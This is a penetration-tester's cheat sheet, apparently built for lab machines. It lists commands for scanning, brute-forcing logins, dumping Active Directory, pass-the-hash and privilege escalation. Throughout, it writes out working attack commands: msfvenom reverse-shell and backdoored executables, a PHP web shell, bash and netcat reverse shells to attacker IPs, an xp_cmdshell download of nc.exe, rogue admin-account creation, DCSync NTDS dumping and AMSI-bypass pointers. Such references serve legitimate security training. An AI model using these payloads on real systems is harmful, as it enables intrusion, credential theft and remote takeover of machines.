Nmap -sC -sV -oA export_path/filename IP Address
Nmap -vv -n -Pn -T2 -sT --max-retries=1 -p 445,80 10.10.10.185
Firewall evasion: -sW (Windows Size), -f (Fragment ff), --spoof-mac Cisco, mtu 24 (multiple of 8), badsum (invalid checksum)
  Locate -r nse$ | grep ldap (search Kali for NMAP scripts)

HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get  /manager/html
  Proxy is used with Burp Suite; -C is pass list username:password; -vV is Verbose
  hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
  hydra -l floris -P /usr/share/wordlists/rockyou.txt 10.10.10.150 http-post "/index.php:username=^USER^&passwd=^PASS^&Login:Warning"
  hydra -l admin -P /opt/seclist/rockyout.txt -f 10.10.110.10 <http-post|http-get> /URI

Msfvenom
  https://github.com/g0tmi1k/msfpc (G0tmi1k msfvenom script)
  https://netsec.ws/?p=331 (examples)
  Msfvenom -l formats (list format such as asp, dll, exe, war)
  Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o filename.war
  War files are just like zip files used by Tomcat
    Example
    msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=192.168.0.30 LPORT=8443 -o /home/scott/my-exploits/compiled/good_one.exe
    msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /root/putty.exe LHOST=192.168.0.14 LPORT=5555 > evilputty.exe  
    Backdoor EXE
    
Visual Studio Compiler
  - New Project -> Console Application -> Name File
  - Open program.cs (solution explorer on right panel)
  - Paste *.cs code in top window and modify and callback IP and Ports
  - Select Properties for the file and select the correct .Net version
  - Build -> Build Solution
  - Source Code: https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
  
DNS Zone Transfer
  dig axfr domain-name @10.10.10.123
  
TimeSync
  ntpdate -u 10.10.10.172
  
Burp
  Cntrl+shift+r sends request to the repeter.
  You can modify the request and select Go to try different requests.
  On the repeater tab you can right click and change to a POST reqest instead of a GET.
  
PHP script
  <?php system($_REQUEST['myvariable']); ?>
  In Burp repeater you can change to a POST and add myvariable=whoami OR myvariable=bash -c 'bash -i >& /dev/tcp/myip/port 0>&1'
  In Burp you can press Cntl+u to URL encode the POST request
  
Magic Bytes
  Php script that looks like a GIF. The line before the <?php... you will put GIF8;
  
Burp and SQLMap
  Using Burp copy the request. Right click on the request and select copy to file and name it whatever.req
  sqlmap -r whatever.req (--batch) (--dbms mysql) (--force-ssl) (-p ID)
    The -p is for parameter to test sql injections on

Msfconsole
  Vim meterpreter.rc
     use exploit/multi/handler
     set PAYLOAD windows/meterpreter/reverse_tcp
     set LHOST 192.168.1.184
     set ExitOnSession false
     echo exploit -j -z
  Run the above script with msfconsole -r meterpreter.rc

Msfdb run (runs Metasploit while starting the database)
  Use exploit/multi/handler
  Exploit -j (run in background)
  Jobs (view active listeners)
  Sessions -l (list active sessions)
  
Meterpreter Socks Proxy (Setup socks proxy from meterpreter)
  route add 10.9.0.0/16 <session #>
  use server/socks4a (set port 9050)
Proxychains Meterpreter (Send meterpreter through socks proxy)
  setg proxies socks4:127.0.0.1:9050
  set ReverseAllowProxy true

Silent Trinity (Good C2)
  https://github.com/byt3bl33d3r/SILENTTRINITY
  Python -m pip install -r requirements.txt
  Python3.7 st.py (starts the program)
  Example https://www.youtube.com/watch?v=PJeBIey8gc4 (at 31:00)

Wfuzz (Brute Force Web Usernames)
  Wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d “username=FUZZ&password=whatever” --hs “No account found with that username.” http://10.10.10.97/login.php
  -d was received from BurpSuite based on the post data that was sent
  HTTP Dir Search
  wfuzz -c -w /usr/share/wfuzz/wordlist/webservices/ws-dirs.txt --hs "404" http://10.10.10.121/FUZZ
  
Gobuster (Find website directories)
  Gobuster -w /usr/share/wordlists/dirbuster/wordlist.txt -u http://10.10.10.85:3000 -x html,php  -o outputfile.log -t 50
  -s to change the status codes (example gobuster -w .... output.log -s 200,301
  
Dirb (Find website directories)
  dirb http://10.10.10.187 <wordlist> -X .php,.html -N 302 -w -z 100 -r -v -t -u admin:password -p 10.10.10.187:3129 -o dirb.log
  -X: file extensions (-x /usr/share/dirb/wordlists/extensions_common.txt)
  -c: Cookies (-c api-key:sefFFaf23s,uuid:2)
  -N: ignore status code
  -w: show warning messages (in-depth scan)
  -z: delay miliseconds
  -r: Do NOT recurse
  -v: show 404 codes
  -t: Do NOT add trailing / at the end
  -u: username:password (HTTP Authorization) 
  -p: proxy:port (Good for Access forbidden)
  -o: output
  
Generate Website Wordlist
  cewl http://10.10.10.175/index.html
  cewl -d 5 -m 3 http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers >> webpass.txt

Test XSS
  <center>test</center>
  If the text is centered and the source contains the html code it is not filtering html code

LDAP Dump
  ldapdomaindump
  Anonymous: ldapsearch -LLL -x -H ldap://cascade.local -b 'DC=cascade,DC=local' -E pr=1000/noprompt
  Bind: ldapsearch -H ldap://fuse.fabricorp.local -x -W -D "svc-scan@fabricorp.local" -b "dc=fabricorp,dc=local"
  nmap -Pn -p 389 --script ldap-search --script-args "DC=cascade,DC=local" 10.10.10.182
  LDAP Extended Attributes
  Get-ADObject -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" -ldapFilter:"(msDs-lastKnownRDN=TempADmin)" -IncludeDeletedObjects -Properties *

Smbmap (shows a list of SMB Shares)
  Smbmap -u Username -p Password -H 10.10.10.97
  Smbclient -U ‘username%password’ \\\\10.10.10.97\share (recurse on) <- List everything
  Pass the Hash
      Smbmap -u alice1978 -p ‘NTLM_Hash:NTLM_Hash’ -H 10.10.10.107 
      -R (-R list contents of shares)
      --download (download file)
  Download file groups.xml (Anonymous)
      smbmap -R sharename -H 10.10.10.100 -A Groups.xml (will download to /usr/share/smbmap)
  
Smbclient
  smbclient -N -L //10.10.10.97 (List all SMB Shares as anonymous)
  smbclient -N //10.10.10.97/share (View Share contents)
  smbclient -U username //10.10.10.97/share 
      <recurse on> to list everything
      <prompt off> to turn off prompts
  smbclient //10.9.15.10/sysvol -U 'corewebdl$%4182816cd42bdb6d20f7fb89703f5c48' --pw-nt-hash
  
SMB Mount Share
  mount -t cifs -o user=<username> //10.10.10.97/share /mnt
  find . -ls | tee /path/output.txt (Output a directory tree listing to a file)
  
SMBcacls
  smbcacls -N //10.10.10.97/sharename /folder (Prints out NTFS permissions)
  
Crackmapexec (https://www.youtube.com/watch?v=Dd4ZAm2mwwA)
  crackmapexec 10.10.10.125 --shares -u '' -p '' (View Anonymous SMB Shares)
  cme smb 10.10.10.125 -u username -p 'password' -x whoami (run CMD command, -X for Powershell)
  cme smb 10.10.10.125 -L (View all SMB Modules)
  cme smb 10.10.10.125 -u username -p 'password' -M mimikatz (runs mimikatz on all hosts you have creds for)
    --otions to see module options
  cme smb 10.10.10.100-125 -u username -p 'password' --shares
    - cme smb 10.10.10.110 -u username -p 'password' --spider sharename --pattern pass (searches for password files)
    - cme smb 10.10.10.110 -u username -p 'password' --spider sharename --pattern pass --content (searches content for password)
  cme smb DC_IP -u username -p 'password' --groups 'Domain Admins' (displays all domain admins)
  cme smb DC_IP -u username -p 'password' -M gpp_password (searches DC SYSVOL for GPP passwords)
  cme smb DC_IP -u username -p 'password'  --ntds (grabs the NTDS file from the DC using DCSync)
  cmd winrm 10.10.10.100-125 -u username -p 'password' (finds systems with WinRM enabled)
    - cmd winrm 10.10.10.100-125 -u username -p 'password' -x (-X powershell) whoami
  cme mssql SQL_IP -u username -p 'password' -x whoami (executes commands using MSSQL)
  cme mssql SQL_IP -u username -p 'password' -M mimikatz (executes mimikatz using MSSQL)
  cmedb (CME database)
    proto smb
    creds
    
Evil-WinRm
  https://github.com/Hackplayers/evil-winrm
  evil-winrm -i 10.10.10.175 -u username -p password 
  -s /path/to/powershell-scripts
  -e /path/to/C#
  -H hash
  menu (show additional options when connected)
  Type PS1 file and enter menu again to see Functions loaded
      Donut-maker
      https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
      pip3 install donut-shellcode
  
Anonymous RPC
  rpcclient -U "" -N 10.10.10.161
  rpcclient -U "username%password" -c "enumdomusers;quit" 10.10.10.161
  rpcclient -U 'corewebdl$%4182816cd42bdb6d20f7fb89703f5c48' --pw-nt-hash 10.9.15.10
  Change PW: setuserinfo2 <username> 23 <'Password'>
  
Impacket Tools
  ./GetADUsers.py core.cyber.local/'corewebdl$' -dc-ip 10.9.15.10 -hashes '0:4182816cd42bdb6d20f7fb89703f5c48'
  
SCF (Shell Command Files)
  If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
  https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
  
File Transfer
  Web Server
    python -m SimpleHTTPServer <port / default 8000>
  SMB Share
    impacket-smbserver files `pwd`
      - files is a name that should be the same as the current directory
      - example: xcopy \\10.10.10.14\files\filename.exe

Kerbrute
  Enum Users: /opt/tools/kerbrute/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield -o kerbrute.userenum.out dom_users.txt
  Password Spray: /opt/tools/kerbrute/kerbrute_linux_amd64 passwordspray --dc 10.10.10.192 -d blackfield dom_users.txt '#00^BlackKnight'

Revrse Shell
  Link: https://blog.barradell-johns.com/index.php/2018/12/30/reverse-shell-cheat-sheet/
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.13.123/5678 0>&1'");phpinfo();?>
  
NetCat
  Listener: nc -lvnp 5555
  NC Bash: nc 10.10.14.171 5555 -e /bin/bash
  NC Windows: nc 10.10.14.3 8081 -e cmd.exe
  OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.171 5555 >/tmp/f &
  File xfer: Listener: nc -l -p 1234 > out.file - Sender: nc -w 3 IP 1234 < out.file
  
Responder (Can grab hash when a system is attempting to connect to you over SMB)
  python /usr/share/responder/Responder.py -I tun0
  python /usr/share/responder/tools/MultiRelay.py -t target_ip -u ALL (target ip is IP of real share. This will get shell)
    ** Need to turn off SMB and HTTP on responder due to conflict. (Edit /usr/share/responder/Responder.conf)
  
SQL
  select @@version
  enable xp_cmdshell
  xp_dirtree '\\10.10.14.171\file' (Start responder and catch the NTLMv2)
  xp_cmdshell "command"
  Upload File
    xp_cmdshell "powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\"http://10.10.14.171:8000/nc.exe\", \"c:\users\mssql-svc\documents\nc.exe\")"

Impacket MSSQL Client
  python mssqlclient.py -p 1433 reporting:@10.10.10.125 -windows-auth
  python psexec.py username:password@10.10.10.125 cmd -path c:\\windows\\system32\\
     --password can be left out and it will prompt
     
MSSQL Commands
  List databases: sp_databases
  Use database: use <dbname>
  List tables: select * from INFORMATION_SCHEMA.TABLES;
  List data: select * from <table name>
  
SQL Shell (sqsh)
  Enum Examples: https://github.com/absolomb/Pentesting/blob/master/guides/Initial%20Enumeration.md
  sqsh -S 10.10.10.52 -U admin -P 'm$$ql_S@_P@ssW0rd!' -D database_name
  select name from master..syslogins;
  go
  
DBeaver (Linux SQL GUI)

Empire 
  https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
  Listeners (brings you to listeners menu)
  Uselistener [tab] to view listeners to use
  Info to see options to set
  Execute
  Back 
  Usestager [tab] to view stagers (same for modules once you have an agent)
  Info to see options to set
  Set listener [tab] to set listener

Hashcat (password cracker)
  hashcat --example-hashes (view example hashes to find the mode)
  Hashcat -m 7400 hashfile.txt /opt/wordlists/rockyou
  NTLMv2 = 5600 
  
PowerUp.ps1
  Import-Module ./PowerUp.ps1
  Invoke-ServiceAbuse -Name 'Service Name'
   - Creates admin john:Password123!
  Invoke-ServiceAbuse -Name 'Service Name' -command "cmd.exe /K C:\Users\mssql-svc\Documents\nc.exe 10.10.14.171 1234 -e cmd.exe"
  Invoke-ServiceAbuse -Name 'Service Name' -command "cmd.exe /K net user bob P@ssword /add"

Searchsploit
  searchsploit program-name
  searchsploit -m exploit-name (mirrors exploit)

Linux Priv Escalation Enumeration
  https://gtfobins.github.io/
  https://dirtycow.ninja/
  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
  https://github.com/DominicBreuker/pspy
  
Binaries (Binaries that can be exploited by an attacker to bypass local security restrictions.)
  Windows (Lolbins): https://github.com/LOLBAS-Project/LOLBAS
  Unix (GTFOBins): https://gtfobins.github.io/
  
FTP
  wget -m fto://anonymous:anonymous@10.10.10.106 (Download all files)

Python Bash Shell
  python -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+z to background
  stty raw -echo
  fg+Enter and hit enter twice
  
Powershell pass Credentials onliner
   powerpick $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('RLAB\ngodfrey_adm', $SecPassword); Get-DomainObject WS04 -Credential $Cred

AMSI
  amsituils (Test if AMSI is enabled)
  Bypass:
     Rasyamouse has a ps1 and C# script.
     https://github.com/rasta-mouse/AmsiScanBufferBypass

Phamton Evasion
Veil
Empire
Weevely
Sentex jhead tool - Used to implant php into an image to make it executable
Microsoft Office Remote Template Injection
  - http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html
